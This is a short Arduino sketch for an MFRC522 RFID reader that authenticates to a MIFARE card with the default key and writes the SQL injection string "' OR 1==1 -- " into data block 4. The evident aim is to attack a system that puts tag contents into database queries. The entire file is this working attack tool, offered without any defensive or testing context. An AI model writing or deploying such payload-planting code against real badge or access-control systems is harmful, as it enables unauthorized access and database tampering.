#include <SPI.h>
#include <MFRC522.h>

#define SS_PIN 5
#define RST_PIN 22
MFRC522 rfid(SS_PIN, RST_PIN);

void setup() {
    Serial.begin(115200);
    SPI.begin();
    rfid.PCD_Init();
    Serial.println("Place your RFID tag near the reader...");

    byte blockNumber = 4; 
    String payloadToWrite = "' OR 1==1 -- ";

    writeDataBlock(blockNumber, payloadToWrite);
}

void loop() {
}

void writeDataBlock(byte blockNumber, String data) {
    if (!rfid.PICC_IsNewCardPresent() || !rfid.PICC_ReadCardSerial()) {
        Serial.println("no card");
        return;
    }

    byte buffer[16];
    for (byte i = 0; i < 16; i++) {
      buffer[i] = i < data.length() ? data[i] : 0;
    }

    MFRC522::MIFARE_Key key;
    for (byte i = 0; i < 6; i++) key.keyByte[i] = 0xFF;

    MFRC522::StatusCode status = rfid.PCD_Authenticate(
        MFRC522::PICC_CMD_MF_AUTH_KEY_A, blockNumber, &key, &(rfid.uid)
    );

    if (status != MFRC522::STATUS_OK) {
        Serial.print("Authentication failed: ");
        Serial.println(rfid.GetStatusCodeName(status));
        return;
    }

    status = rfid.MIFARE_Write(blockNumber, buffer, 16);
    if (status == MFRC522::STATUS_OK) {
        Serial.println("successfully written!");
    } else {
        Serial.print("write failed: ");
        Serial.println(rfid.GetStatusCodeName(status));
    }

    rfid.PICC_HaltA();
    rfid.PCD_StopCrypto1();
}
